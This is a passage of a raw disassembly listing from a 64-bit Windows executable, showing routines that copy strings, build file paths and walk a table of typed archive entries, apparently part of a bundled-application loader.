   140002630:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002635:	e8 66 f9 ff ff       	call   0x140001fa0
   14000263a:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000263d:	74 90                	je     0x1400025cf
   14000263f:	48 8b d3             	mov    %rbx,%rdx
   140002642:	48 8b cf             	mov    %rdi,%rcx
   140002645:	e8 e6 ef ff ff       	call   0x140001630
   14000264a:	48 8b d8             	mov    %rax,%rbx
   14000264d:	48 3b 47 18          	cmp    0x18(%rdi),%rax
   140002651:	0f 82 59 ff ff ff    	jb     0x1400025b0
   140002657:	e9 76 ff ff ff       	jmp    0x1400025d2
   14000265c:	cc                   	int3
   14000265d:	cc                   	int3
   14000265e:	cc                   	int3
   14000265f:	cc                   	int3
   140002660:	e9 cb 14 00 00       	jmp    0x140003b30
   140002665:	cc                   	int3
   140002666:	cc                   	int3
   140002667:	cc                   	int3
   140002668:	cc                   	int3
   140002669:	cc                   	int3
   14000266a:	cc                   	int3
   14000266b:	cc                   	int3
   14000266c:	cc                   	int3
   14000266d:	cc                   	int3
   14000266e:	cc                   	int3
   14000266f:	cc                   	int3
   140002670:	40 53                	rex push %rbx
   140002672:	48 83 ec 20          	sub    $0x20,%rsp
   140002676:	48 8d 15 3b 01 02 00 	lea    0x2013b(%rip),%rdx        # 0x1400227b8
   14000267d:	48 8b d9             	mov    %rcx,%rbx
   140002680:	e8 fb ee ff ff       	call   0x140001580
   140002685:	48 85 c0             	test   %rax,%rax
   140002688:	74 29                	je     0x1400026b3
   14000268a:	48 8d 93 78 30 00 00 	lea    0x3078(%rbx),%rdx
   140002691:	4c 8b c0             	mov    %rax,%r8
   140002694:	33 c9                	xor    %ecx,%ecx
   140002696:	e8 e5 07 00 00       	call   0x140002e80
   14000269b:	48 8b c8             	mov    %rax,%rcx
   14000269e:	48 8b d8             	mov    %rax,%rbx
   1400026a1:	e8 fa 2c 00 00       	call   0x1400053a0
   1400026a6:	48 8b cb             	mov    %rbx,%rcx
   1400026a9:	48 83 c4 20          	add    $0x20,%rsp
   1400026ad:	5b                   	pop    %rbx
   1400026ae:	e9 19 87 00 00       	jmp    0x14000adcc
   1400026b3:	48 83 c4 20          	add    $0x20,%rsp
   1400026b7:	5b                   	pop    %rbx
   1400026b8:	c3                   	ret
   1400026b9:	cc                   	int3
   1400026ba:	cc                   	int3
   1400026bb:	cc                   	int3
   1400026bc:	cc                   	int3
   1400026bd:	cc                   	int3
   1400026be:	cc                   	int3
   1400026bf:	cc                   	int3
   1400026c0:	40 53                	rex push %rbx
   1400026c2:	48 83 ec 20          	sub    $0x20,%rsp
   1400026c6:	48 8b 51 10          	mov    0x10(%rcx),%rdx
   1400026ca:	48 8b d9             	mov    %rcx,%rbx
   1400026cd:	48 3b 51 18          	cmp    0x18(%rcx),%rdx
   1400026d1:	73 25                	jae    0x1400026f8
   1400026d3:	0f b6 42 11          	movzbl 0x11(%rdx),%eax
   1400026d7:	3c 62                	cmp    $0x62,%al
   1400026d9:	74 25                	je     0x140002700
   1400026db:	3c 78                	cmp    $0x78,%al
   1400026dd:	74 21                	je     0x140002700
   1400026df:	3c 5a                	cmp    $0x5a,%al
   1400026e1:	74 1d                	je     0x140002700
   1400026e3:	3c 64                	cmp    $0x64,%al
   1400026e5:	74 19                	je     0x140002700
   1400026e7:	48 8b cb             	mov    %rbx,%rcx
   1400026ea:	e8 41 ef ff ff       	call   0x140001630
   1400026ef:	48 8b d0             	mov    %rax,%rdx
   1400026f2:	48 3b 43 18          	cmp    0x18(%rbx),%rax
   1400026f6:	72 db                	jb     0x1400026d3
   1400026f8:	33 c0                	xor    %eax,%eax
   1400026fa:	48 83 c4 20          	add    $0x20,%rsp
   1400026fe:	5b                   	pop    %rbx
   1400026ff:	c3                   	ret
   140002700:	b8 01 00 00 00       	mov    $0x1,%eax
   140002705:	48 83 c4 20          	add    $0x20,%rsp
   140002709:	5b                   	pop    %rbx
   14000270a:	c3                   	ret
   14000270b:	cc                   	int3
   14000270c:	cc                   	int3
   14000270d:	cc                   	int3
   14000270e:	cc                   	int3
   14000270f:	cc                   	int3
   140002710:	40 56                	rex push %rsi
   140002712:	57                   	push   %rdi
   140002713:	41 57                	push   %r15
   140002715:	b8 30 10 00 00       	mov    $0x1030,%eax
   14000271a:	e8 31 65 00 00       	call   0x140008c50
   14000271f:	48 2b e0             	sub    %rax,%rsp
   140002722:	48 8b 05 e7 f8 02 00 	mov    0x2f8e7(%rip),%rax        # 0x140032010
   140002729:	48 33 c4             	xor    %rsp,%rax
   14000272c:	48 89 84 24 20 10 00 	mov    %rax,0x1020(%rsp)
   140002733:	00 
   140002734:	48 8b 79 10          	mov    0x10(%rcx),%rdi
   140002738:	48 8b f1             	mov    %rcx,%rsi
   14000273b:	48 8d 0d a6 ff 01 00 	lea    0x1ffa6(%rip),%rcx        # 0x1400226e8
   140002742:	ff 15 78 04 03 00    	call   *0x30478(%rip)        # 0x140032bc0
   140002748:	4c 8b f8             	mov    %rax,%r15
   14000274b:	48 85 c0             	test   %rax,%rax
   14000274e:	75 14                	jne    0x140002764
   140002750:	48 8d 0d a1 ff 01 00 	lea    0x1ffa1(%rip),%rcx        # 0x1400226f8
   140002757:	e8 24 f6 ff ff       	call   0x140001d80
   14000275c:	83 c8 ff             	or     $0xffffffff,%eax
   14000275f:	e9 59 01 00 00       	jmp    0x1400028bd
   140002764:	49 8b cf             	mov    %r15,%rcx
   140002767:	4c 89 b4 24 68 10 00 	mov    %r14,0x1068(%rsp)
   14000276e:	00 
   14000276f:	ff 15 8b 04 03 00    	call   *0x3048b(%rip)        # 0x140032c00
   140002775:	4c 8b f0             	mov    %rax,%r14
   140002778:	48 85 c0             	test   %rax,%rax
   14000277b:	75 14                	jne    0x140002791
   14000277d:	48 8d 0d 94 ff 01 00 	lea    0x1ff94(%rip),%rcx        # 0x140022718
   140002784:	e8 f7 f5 ff ff       	call   0x140001d80
   140002789:	83 c8 ff             	or     $0xffffffff,%eax
   14000278c:	e9 24 01 00 00       	jmp    0x1400028b5
   140002791:	48 89 9c 24 58 10 00 	mov    %rbx,0x1058(%rsp)
   140002798:	00 
   140002799:	48 89 ac 24 60 10 00 	mov    %rbp,0x1060(%rsp)
   1400027a0:	00 
   1400027a1:	48 3b 7e 18          	cmp    0x18(%rsi),%rdi
   1400027a5:	0f 83 f8 00 00 00    	jae    0x1400028a3
   1400027ab:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400027b0:	80 7f 11 73          	cmpb   $0x73,0x11(%rdi)
   1400027b4:	0f 85 d1 00 00 00    	jne    0x14000288b
   1400027ba:	48 8b d7             	mov    %rdi,%rdx
   1400027bd:	48 8b ce             	mov    %rsi,%rcx
   1400027c0:	e8 6b ea ff ff       	call   0x140001230
   1400027c5:	48 8d 5f 12          	lea    0x12(%rdi),%rbx
   1400027c9:	ba 00 10 00 00       	mov    $0x1000,%edx
   1400027ce:	48 8b cb             	mov    %rbx,%rcx
   1400027d1:	48 8b e8             	mov    %rax,%rbp
   1400027d4:	e8 a7 82 00 00       	call   0x14000aa80
   1400027d9:	48 3d fc 0f 00 00    	cmp    $0xffc,%rax
   1400027df:	0f 83 2a 01 00 00    	jae    0x14000290f
   1400027e5:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400027ea:	48 2b cb             	sub    %rbx,%rcx
   1400027ed:	0f 1f 00             	nopl   (%rax)
   1400027f0:	0f b6 03             	movzbl (%rbx),%eax
   1400027f3:	88 04 19             	mov    %al,(%rcx,%rbx,1)
   1400027f6:	48 8d 5b 01          	lea    0x1(%rbx),%rbx
   1400027fa:	84 c0                	test   %al,%al
   1400027fc:	75 f2                	jne    0x1400027f0
   1400027fe:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002803:	48 ff c9             	dec    %rcx
   140002806:	80 79 01 00          	cmpb   $0x0,0x1(%rcx)
   14000280a:	48 8d 49 01          	lea    0x1(%rcx),%rcx
   14000280e:	75 f6                	jne    0x140002806
   140002810:	83 3d c5 e8 03 00 00 	cmpl   $0x0,0x3e8c5(%rip)        # 0x1400410dc
   140002817:	8b 05 3b ff 01 00    	mov    0x1ff3b(%rip),%eax        # 0x140022758
   14000281d:	89 01                	mov    %eax,(%rcx)
   14000281f:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002824:	74 08                	je     0x14000282e
   140002826:	ff 15 bc 03 03 00    	call   *0x303bc(%rip)        # 0x140032be8
   14000282c:	eb 06                	jmp    0x140002834
   14000282e:	ff 15 bc 03 03 00    	call   *0x303bc(%rip)        # 0x140032bf0
   140002834:	4c 8b c0             	mov    %rax,%r8
   140002837:	48 8d 15 22 ff 01 00 	lea    0x1ff22(%rip),%rdx        # 0x140022760
   14000283e:	49 8b cf             	mov    %r15,%rcx
   140002841:	48 8b d8             	mov    %rax,%rbx
   140002844:	ff 15 7e 03 03 00    	call   *0x3037e(%rip)        # 0x140032bc8
   14000284a:	48 8b cb             	mov    %rbx,%rcx
   14000284d:	ff 15 1d 03 03 00    	call   *0x3031d(%rip)        # 0x140032b70
   140002853:	8b 4f 0c             	mov    0xc(%rdi),%ecx
   140002856:	e8 17 63 00 00       	call   0x140008b72
   14000285b:	8b d0                	mov    %eax,%edx
   14000285d:	48 8b cd             	mov    %rbp,%rcx
   140002860:	ff 15 12 04 03 00    	call   *0x30412(%rip)        # 0x140032c78
   140002866:	48 85 c0             	test   %rax,%rax
   140002869:	0f 84 85 00 00 00    	je     0x1400028f4
   14000286f:	4d 8b c6             	mov    %r14,%r8
   140002872:	49 8b d6             	mov    %r14,%rdx
   140002875:	48 8b c8             	mov    %rax,%rcx
   140002878:	ff 15 f2 03 03 00    	call   *0x303f2(%rip)        # 0x140032c70
   14000287e:	48 85 c0             	test   %rax,%rax
   140002881:	74 56                	je     0x1400028d9
   140002883:	48 8b cd             	mov    %rbp,%rcx
   140002886:	e8 41 85 00 00       	call   0x14000adcc
   14000288b:	48 8b d7             	mov    %rdi,%rdx
   14000288e:	48 8b ce             	mov    %rsi,%rcx
   140002891:	e8 9a ed ff ff       	call   0x140001630
   140002896:	48 8b f8             	mov    %rax,%rdi
   140002899:	48 3b 46 18          	cmp    0x18(%rsi),%rax
   14000289d:	0f 82 0d ff ff ff    	jb     0x1400027b0
   1400028a3:	33 c0                	xor    %eax,%eax
   1400028a5:	48 8b ac 24 60 10 00 	mov    0x1060(%rsp),%rbp
   1400028ac:	00 
   1400028ad:	48 8b 9c 24 58 10 00 	mov    0x1058(%rsp),%rbx
   1400028b4:	00 
   1400028b5:	4c 8b b4 24 68 10 00 	mov    0x1068(%rsp),%r14
   1400028bc:	00 
   1400028bd:	48 8b 8c 24 20 10 00 	mov    0x1020(%rsp),%rcx
   1400028c4:	00 
   1400028c5:	48 33 cc             	xor    %rsp,%rcx
   1400028c8:	e8 43 63 00 00       	call   0x140008c10
   1400028cd:	48 81 c4 30 10 00 00 	add    $0x1030,%rsp
   1400028d4:	41 5f                	pop    %r15
   1400028d6:	5f                   	pop    %rdi
   1400028d7:	5e                   	pop    %rsi
   1400028d8:	c3                   	ret
   1400028d9:	ff 15 41 03 03 00    	call   *0x30341(%rip)        # 0x140032c20
   1400028df:	48 8d 57 12          	lea    0x12(%rdi),%rdx
   1400028e3:	48 8d 0d ae fe 01 00 	lea    0x1feae(%rip),%rcx        # 0x140022798
   1400028ea:	e8 91 f4 ff ff       	call   0x140001d80
   1400028ef:	83 c8 ff             	or     $0xffffffff,%eax
   1400028f2:	eb b1                	jmp    0x1400028a5
   1400028f4:	48 8d 57 12          	lea    0x12(%rdi),%rdx
   1400028f8:	48 8d 0d 71 fe 01 00 	lea    0x1fe71(%rip),%rcx        # 0x140022770
   1400028ff:	e8 7c f4 ff ff       	call   0x140001d80
   140002904:	ff 15 16 03 03 00    	call   *0x30316(%rip)        # 0x140032c20
   14000290a:	83 c8 ff             	or     $0xffffffff,%eax
   14000290d:	eb 96                	jmp    0x1400028a5
   14000290f:	48 8d 0d 2a fe 01 00 	lea    0x1fe2a(%rip),%rcx        # 0x140022740
   140002916:	e8 65 f4 ff ff       	call   0x140001d80
   14000291b:	83 c8 ff             	or     $0xffffffff,%eax
   14000291e:	eb 85                	jmp    0x1400028a5
   140002920:	40 55                	rex push %rbp
   140002922:	57                   	push   %rdi
   140002923:	41 56                	push   %r14
   140002925:	b8 30 30 00 00       	mov    $0x3030,%eax
   14000292a:	e8 21 63 00 00       	call   0x140008c50
   14000292f:	48 2b e0             	sub    %rax,%rsp
   140002932:	48 8b 05 d7 f6 02 00 	mov    0x2f6d7(%rip),%rax        # 0x140032010
   140002939:	48 33 c4             	xor    %rsp,%rax
   14000293c:	48 89 84 24 20 30 00 	mov    %rax,0x3020(%rsp)
   140002943:	00 
   140002944:	8b e9                	mov    %ecx,%ebp
   140002946:	4c 8b f2             	mov    %rdx,%r14
   140002949:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000294e:	e8 5d 94 00 00       	call   0x14000bdb0
   140002953:	48 8b c8             	mov    %rax,%rcx
   140002956:	33 d2                	xor    %edx,%edx
   140002958:	e8 6f c6 00 00       	call   0x14000efcc
   14000295d:	ba 90 40 00 00       	mov    $0x4090,%edx
   140002962:	b9 01 00 00 00       	mov    $0x1,%ecx
   140002967:	e8 58 c6 00 00       	call   0x14000efc4
   14000296c:	48 8b f8             	mov    %rax,%rdi
   14000296f:	48 85 c0             	test   %rax,%rax
   140002972:	75 1b                	jne    0x14000298f
   140002974:	48 8d 15 5d fe 01 00 	lea    0x1fe5d(%rip),%rdx        # 0x1400227d8
   14000297b:	48 8d 0d 82 fe 01 00 	lea    0x1fe82(%rip),%rcx        # 0x140022804
   140002982:	e8 d9 ef ff ff       	call   0x140001960
   140002987:	83 c8 ff             	or     $0xffffffff,%eax
   14000298a:	e9 4e 02 00 00       	jmp    0x140002bdd
   14000298f:	49 8b 16             	mov    (%r14),%rdx
   140002992:	48 8d 8c 24 20 10 00 	lea    0x1020(%rsp),%rcx
   140002999:	00 
   14000299a:	48 89 b4 24 68 30 00 	mov    %rsi,0x3068(%rsp)
   1400029a1:	00 
   1400029a2:	e8 19 03 00 00       	call   0x140002cc0
   1400029a7:	48 8d 94 24 20 10 00 	lea    0x1020(%rsp),%rdx
   1400029ae:	00 
   1400029af:	48 8d 8c 24 20 20 00 	lea    0x2020(%rsp),%rcx
   1400029b6:	00 
   1400029b7:	e8 44 02 00 00       	call   0x140002c00
   1400029bc:	48 8d 94 24 20 10 00 	lea    0x1020(%rsp),%rdx
   1400029c3:	00 
   1400029c4:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400029c9:	e8 a2 04 00 00       	call   0x140002e70
   1400029ce:	48 8d 0d 3b fe 01 00 	lea    0x1fe3b(%rip),%rcx        # 0x140022810
   1400029d5:	e8 86 1f 00 00       	call   0x140004960
   1400029da:	48 8d 0d 2f fe 01 00 	lea    0x1fe2f(%rip),%rcx        # 0x140022810
   1400029e1:	48 8b f0             	mov    %rax,%rsi
   1400029e4:	e8 f7 25 00 00       	call   0x140004fe0
   1400029e9:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
   1400029ee:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
   1400029f2:	48 ff c1             	inc    %rcx
   1400029f5:	80 3c 08 00          	cmpb   $0x0,(%rax,%rcx,1)
   1400029f9:	75 f7                	jne    0x1400029f2
   1400029fb:	4c 8d 84 24 20 10 00 	lea    0x1020(%rsp),%r8
   140002a02:	00 
   140002a03:	4c 03 c1             	add    %rcx,%r8
   140002a06:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140002a0b:	48 8b cf             	mov    %rdi,%rcx
   140002a0e:	e8 ad ee ff ff       	call   0x1400018c0
   140002a13:	85 c0                	test   %eax,%eax
   140002a15:	74 52                	je     0x140002a69
   140002a17:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140002a1c:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140002a20:	48 ff c0             	inc    %rax
   140002a23:	80 3c 01 00          	cmpb   $0x0,(%rcx,%rax,1)
   140002a27:	75 f7                	jne    0x140002a20
   140002a29:	4c 8d 84 24 20 20 00 	lea    0x2020(%rsp),%r8
   140002a30:	00 
   140002a31:	48 8b cf             	mov    %rdi,%rcx
   140002a34:	4c 03 c0             	add    %rax,%r8
   140002a37:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140002a3c:	e8 7f ee ff ff       	call   0x1400018c0
   140002a41:	85 c0                	test   %eax,%eax
   140002a43:	74 24                	je     0x140002a69
   140002a45:	4c 8d 84 24 20 20 00 	lea    0x2020(%rsp),%r8
   140002a4c:	00 
   140002a4d:	48 8d 94 24 20 10 00 	lea    0x1020(%rsp),%rdx
   140002a54:	00 
   140002a55:	48 8d 0d c4 fd 01 00 	lea    0x1fdc4(%rip),%rcx        # 0x140022820
   140002a5c:	e8 1f f3 ff ff       	call   0x140001d80
   140002a61:	83 c8 ff             	or     $0xffffffff,%eax
   140002a64:	e9 6c 01 00 00       	jmp    0x140002bd5
   140002a69:	48 89 9c 24 60 30 00 	mov    %rbx,0x3060(%rsp)
   140002a70:	00 
   140002a71:	89 af 80 40 00 00    	mov    %ebp,0x4080(%rdi)
   140002a77:	4c 89 b7 88 40 00 00 	mov    %r14,0x4088(%rdi)
   140002a7e:	48 85 f6             	test   %rsi,%rsi
   140002a81:	75 15                	jne    0x140002a98
   140002a83:	48 8b cf             	mov    %rdi,%rcx
   140002a86:	e8 35 fc ff ff       	call   0x1400026c0
   140002a8b:	85 c0                	test   %eax,%eax
   140002a8d:	0f 85 ba 00 00 00    	jne    0x140002b4d
   140002a93:	48 8d 74 24 20       	lea    0x20(%rsp),%rsi
   140002a98:	45 33 c0             	xor    %r8d,%r8d
   140002a9b:	48 8b d6             	mov    %rsi,%rdx
   140002a9e:	33 c9                	xor    %ecx,%ecx
   140002aa0:	e8 0b 30 00 00       	call   0x140005ab0
   140002aa5:	48 8b c8             	mov    %rax,%rcx
   140002aa8:	48 8b d8             	mov    %rax,%rbx
   140002aab:	ff 15 6f f5 01 00    	call   *0x1f56f(%rip)        # 0x140022020
   140002ab1:	48 8b cb             	mov    %rbx,%rcx
   140002ab4:	e8 13 83 00 00       	call   0x14000adcc
   140002ab9:	48 85 f6             	test   %rsi,%rsi
   140002abc:	0f 84 8b 00 00 00    	je     0x140002b4d
   140002ac2:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
   140002ac7:	4c 8b c6             	mov    %rsi,%r8
   140002aca:	4c 2b c0             	sub    %rax,%r8
   140002acd:	0f 1f 00             	nopl   (%rax)
   140002ad0:	0f b6 10             	movzbl (%rax),%edx
   140002ad3:	42 0f b6 0c 00       	movzbl (%rax,%r8,1),%ecx
   140002ad8:	2b d1                	sub    %ecx,%edx
   140002ada:	75 07                	jne    0x140002ae3
   140002adc:	48 ff c0             	inc    %rax
   140002adf:	85 c9                	test   %ecx,%ecx
   140002ae1:	75 ed                	jne    0x140002ad0
   140002ae3:	85 d2                	test   %edx,%edx
   140002ae5:	74 47                	je     0x140002b2e
   140002ae7:	48 8d 9f 78 20 00 00 	lea    0x2078(%rdi),%rbx
   140002aee:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140002af4:	48 8b cb             	mov    %rbx,%rcx
   140002af7:	48 8b d6             	mov    %rsi,%rdx
   140002afa:	e8 21 bb 00 00       	call   0x14000e620
   140002aff:	80 bf 77 30 00 00 00 	cmpb   $0x0,0x3077(%rdi)
   140002b06:	0f 85 84 00 00 00    	jne    0x140002b90
   140002b0c:	48 8d 8f 78 30 00 00 	lea    0x3078(%rdi),%rcx
   140002b13:	c7 87 78 40 00 00 01 	movl   $0x1,0x4078(%rdi)
   140002b1a:	00 00 00 
   140002b1d:	48 2b cb             	sub    %rbx,%rcx
   140002b20:	0f b6 03             	movzbl (%rbx),%eax
   140002b23:	88 04 19             	mov    %al,(%rcx,%rbx,1)
   140002b26:	48 8d 5b 01          	lea    0x1(%rbx),%rbx
   140002b2a:	84 c0                	test   %al,%al
   140002b2c:	75 f2                	jne    0x140002b20
   140002b2e:	48 8b cf             	mov    %rdi,%rcx
   140002b31:	e8 3a fb ff ff       	call   0x140002670
   140002b36:	48 8b cf             	mov    %rdi,%rcx
   140002b39:	e8 b2 f9 ff ff       	call   0x1400024f0
   140002b3e:	48 8b cf             	mov    %rdi,%rcx
   140002b41:	8b d8                	mov    %eax,%ebx
   140002b43:	e8 18 fb ff ff       	call   0x140002660
   140002b48:	e9 7e 00 00 00       	jmp    0x140002bcb
   140002b4d:	48 8b cf             	mov    %rdi,%rcx
   140002b50:	e8 fb f9 ff ff       	call   0x140002550
   140002b55:	85 c0                	test   %eax,%eax
   140002b57:	75 37                	jne    0x140002b90
   140002b59:	48 8d b7 78 20 00 00 	lea    0x2078(%rdi),%rsi
   140002b60:	38 06                	cmp    %al,(%rsi)
   140002b62:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140002b67:	48 8d 0d a2 fc 01 00 	lea    0x1fca2(%rip),%rcx        # 0x140022810
   140002b6e:	48 0f 45 d6          	cmovne %rsi,%rdx
   140002b72:	e8 f9 23 00 00       	call   0x140004f70
   140002b77:	48 8d 0d 92 fc 01 00 	lea    0x1fc92(%rip),%rcx        # 0x140022810
   140002b7e:	e8 dd 1d 00 00       	call   0x140004960
   140002b83:	48 8b cf             	mov    %rdi,%rcx
   140002b86:	e8 85 69 00 00       	call   0x140009510
   140002b8b:	83 f8 ff             	cmp    $0xffffffff,%eax
   140002b8e:	75 05                	jne    0x140002b95
   140002b90:	83 c8 ff             	or     $0xffffffff,%eax
   140002b93:	eb 38                	jmp    0x140002bcd
   140002b95:	e8 96 69 00 00       	call   0x140009530
   140002b9a:	4d 8b ce             	mov    %r14,%r9
   140002b9d:	48 8d 8c 24 20 10 00 	lea    0x1020(%rsp),%rcx
   140002ba4:	00 
   140002ba5:	44 8b c5             	mov    %ebp,%r8d
   140002ba8:	48 8b d7             	mov    %rdi,%rdx
   140002bab:	e8 70 24 00 00       	call   0x140005020
   140002bb0:	83 bf 78 40 00 00 01 	cmpl   $0x1,0x4078(%rdi)
   140002bb7:	8b d8                	mov    %eax,%ebx
   140002bb9:	75 08                	jne    0x140002bc3
   140002bbb:	48 8b ce             	mov    %rsi,%rcx
   140002bbe:	e8 4d 20 00 00       	call   0x140004c10
   140002bc3:	48 8b cf             	mov    %rdi,%rcx
   140002bc6:	e8 45 ed ff ff       	call   0x140001910
   140002bcb:	8b c3                	mov    %ebx,%eax
   140002bcd:	48 8b 9c 24 60 30 00 	mov    0x3060(%rsp),%rbx
   140002bd4:	00 
   140002bd5:	48 8b b4 24 68 30 00 	mov    0x3068(%rsp),%rsi
   140002bdc:	00 
   140002bdd:	48 8b 8c 24 20 30 00 	mov    0x3020(%rsp),%rcx
   140002be4:	00 
   140002be5:	48 33 cc             	xor    %rsp,%rcx
   140002be8:	e8 23 60 00 00       	call   0x140008c10
   140002bed:	48 81 c4 30 30 00 00 	add    $0x3030,%rsp
   140002bf4:	41 5e                	pop    %r14
   140002bf6:	5f                   	pop    %rdi
   140002bf7:	5d                   	pop    %rbp
   140002bf8:	c3                   	ret
   140002bf9:	cc                   	int3
   140002bfa:	cc                   	int3
   140002bfb:	cc                   	int3
   140002bfc:	cc                   	int3
   140002bfd:	cc                   	int3
   140002bfe:	cc                   	int3
   140002bff:	cc                   	int3
   140002c00:	4c 8b c1             	mov    %rcx,%r8
   140002c03:	4c 2b c2             	sub    %rdx,%r8
   140002c06:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140002c0d:	00 00 00 
   140002c10:	0f b6 02             	movzbl (%rdx),%eax
   140002c13:	41 88 04 10          	mov    %al,(%r8,%rdx,1)
   140002c17:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   140002c1b:	84 c0                	test   %al,%al
   140002c1d:	75 f1                	jne    0x140002c10
   140002c1f:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140002c23:	80 7c 01 01 00       	cmpb   $0x0,0x1(%rcx,%rax,1)
   140002c28:	48 8d 40 01          	lea    0x1(%rax),%rax
   140002c2c:	75 f5                	jne    0x140002c23
   140002c2e:	c7 44 08 fd 70 6b 67 	movl   $0x676b70,-0x3(%rax,%rcx,1)
   140002c35:	00 
   140002c36:	c3                   	ret
   140002c37:	cc                   	int3
   140002c38:	cc                   	int3
   140002c39:	cc                   	int3
   140002c3a:	cc                   	int3
   140002c3b:	cc                   	int3
   140002c3c:	cc                   	int3
   140002c3d:	cc                   	int3
   140002c3e:	cc                   	int3
   140002c3f:	cc                   	int3
   140002c40:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002c45:	57                   	push   %rdi
   140002c46:	48 83 ec 20          	sub    $0x20,%rsp
   140002c4a:	48 83 cb ff          	or     $0xffffffffffffffff,%rbx
   140002c4e:	48 8b f9             	mov    %rcx,%rdi
   140002c51:	4c 8b c3             	mov    %rbx,%r8
   140002c54:	49 ff c0             	inc    %r8
   140002c57:	42 80 3c 02 00       	cmpb   $0x0,(%rdx,%r8,1)
   140002c5c:	75 f6                	jne    0x140002c54
   140002c5e:	49 ff c0             	inc    %r8
   140002c61:	e8 ba b9 00 00       	call   0x14000e620
   140002c66:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140002c6d:	00 00 00 
   140002c70:	80 7c 1f 01 00       	cmpb   $0x0,0x1(%rdi,%rbx,1)
   140002c75:	48 8d 5b 01          	lea    0x1(%rbx),%rbx
   140002c79:	75 f5                	jne    0x140002c70
   140002c7b:	80 3c 3b 5c          	cmpb   $0x5c,(%rbx,%rdi,1)
   140002c7f:	75 04                	jne    0x140002c85
   140002c81:	c6 04 3b 00          	movb   $0x0,(%rbx,%rdi,1)
   140002c85:	ba 5c 00 00 00       	mov    $0x5c,%edx
   140002c8a:	48 8b cf             	mov    %rdi,%rcx
   140002c8d:	e8 ba 6f 00 00       	call   0x140009c4c
   140002c92:	48 85 c0             	test   %rax,%rax
   140002c95:	74 0e                	je     0x140002ca5
   140002c97:	c6 00 00             	movb   $0x0,(%rax)
   140002c9a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002c9f:	48 83 c4 20          	add    $0x20,%rsp
   140002ca3:	5f                   	pop    %rdi
   140002ca4:	c3                   	ret
   140002ca5:	66 c7 07 2e 00       	movw   $0x2e,(%rdi)
   140002caa:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002caf:	48 83 c4 20          	add    $0x20,%rsp
   140002cb3:	5f                   	pop    %rdi
   140002cb4:	c3                   	ret
   140002cb5:	cc                   	int3
   140002cb6:	cc                   	int3
   140002cb7:	cc                   	int3
   140002cb8:	cc                   	int3
   140002cb9:	cc                   	int3
   140002cba:	cc                   	int3
   140002cbb:	cc                   	int3
   140002cbc:	cc                   	int3
   140002cbd:	cc                   	int3
   140002cbe:	cc                   	int3
   140002cbf:	cc                   	int3
   140002cc0:	40 53                	rex push %rbx
   140002cc2:	b8 30 20 00 00       	mov    $0x2030,%eax
   140002cc7:	e8 84 5f 00 00       	call   0x140008c50
   140002ccc:	48 2b e0             	sub    %rax,%rsp
   140002ccf:	48 8b 05 3a f3 02 00 	mov    0x2f33a(%rip),%rax        # 0x140032010
   140002cd6:	48 33 c4             	xor    %rsp,%rax
   140002cd9:	48 89 84 24 20 20 00 	mov    %rax,0x2020(%rsp)
   140002ce0:	00 
   140002ce1:	48 8b d9             	mov    %rcx,%rbx
   140002ce4:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140002ce9:	33 c9                	xor    %ecx,%ecx
   140002ceb:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140002cf1:	ff 15 31 f3 01 00    	call   *0x1f331(%rip)        # 0x140022028
   140002cf7:	85 c0                	test   %eax,%eax
   140002cf9:	75 18                	jne    0x140002d13
   140002cfb:	48 8d 15 46 fb 01 00 	lea    0x1fb46(%rip),%rdx        # 0x140022848
   140002d02:	48 8d 0d 5f fb 01 00 	lea    0x1fb5f(%rip),%rcx        # 0x140022868
   140002d09:	e8 52 ee ff ff       	call   0x140001b60
   140002d0e:	83 c8 ff             	or     $0xffffffff,%eax
   140002d11:	eb 2b                	jmp    0x140002d3e
   140002d13:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   140002d19:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140002d1e:	48 8b cb             	mov    %rbx,%rcx
   140002d21:	e8 6a 2e 00 00       	call   0x140005b90
   140002d26:	48 85 c0             	test   %rax,%rax
   140002d29:	75 11                	jne    0x140002d3c
   140002d2b:	48 8d 0d 4e fb 01 00 	lea    0x1fb4e(%rip),%rcx        # 0x140022880
   140002d32:	e8 49 f0 ff ff       	call   0x140001d80
   140002d37:	83 c8 ff             	or     $0xffffffff,%eax
   140002d3a:	eb 02                	jmp    0x140002d3e
   140002d3c:	33 c0                	xor    %eax,%eax
   140002d3e:	48 8b 8c 24 20 20 00 	mov    0x2020(%rsp),%rcx
   140002d45:	00 
   140002d46:	48 33 cc             	xor    %rsp,%rcx
   140002d49:	e8 c2 5e 00 00       	call   0x140008c10
   140002d4e:	48 81 c4 30 20 00 00 	add    $0x2030,%rsp
   140002d55:	5b                   	pop    %rbx
   140002d56:	c3                   	ret
   140002d57:	cc                   	int3
   140002d58:	cc                   	int3
   140002d59:	cc                   	int3
   140002d5a:	cc                   	int3
   140002d5b:	cc                   	int3
   140002d5c:	cc                   	int3
   140002d5d:	cc                   	int3
   140002d5e:	cc                   	int3
   140002d5f:	cc                   	int3
   140002d60:	b8 78 20 00 00       	mov    $0x2078,%eax
